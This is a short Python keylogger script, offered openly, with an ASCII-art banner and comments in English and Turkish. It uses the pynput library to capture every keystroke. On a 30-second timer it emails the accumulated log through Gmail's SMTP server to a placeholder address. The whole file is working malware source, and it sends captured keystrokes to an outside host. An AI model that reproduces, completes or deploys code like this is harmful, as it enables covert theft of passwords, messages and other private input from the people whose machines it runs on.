#!/usr/bin/env python3

"""
 __                        __ _            ___                _____  
 / _|_ __ ___  _ __ ___    / _| | _____  __/ / |_ _   _ _ __  / _ \ \ 
| |_| '__/ _ \| '_ ` _ \  | |_| |/ _ \ \/ / || __| | | | '_ \| | | | |
|  _| | | (_) | | | | | | |  _| |  __/>  <| || |_| |_| | | | | |_| | |
|_| |_|  \___/|_| |_| |_| |_| |_|\___/_/\_\ | \__|\__,_|_| |_|\___/| |
                                           \_\                    /_/ 


"""

#IMPORTANT: IF YOUR ACCOUNT IS SECURE, YOU CANNOT LOG IN AND GET AN ERRORS  !!!!!!

## required libraries:.:
import pynput.keyboard
import smtplib

#import time#
import threading

log = ""#log variable

def callback_function(key):
    global log #Globally call [log] variable
    try:
        log = log+key.char.encode("utf8")
            #We converted every character in [log] to sting and (set to utf-8 standards)
    except AttributeError:#AttributeError
        if key == key.space:
            #if space   
            log = log + str(key)
    print(log)

def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
        #enable server connection
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
        #sender and receiver must be the same..:
    email_server.quit()
    '''işlem sonlandır '''

#/[function repeat]/name
def thread_function():
    global log
    send_email("deneme@gmail.com", " ", log)#just enter your email address and password
    log=""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()
    '''asenkron çalışması için çok önemlidir eğer progrm
    asenkrob bir şekilde çalışmassa hata alma olasılıgı artar'''

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    thread_function()
    keylogger_listener.join()
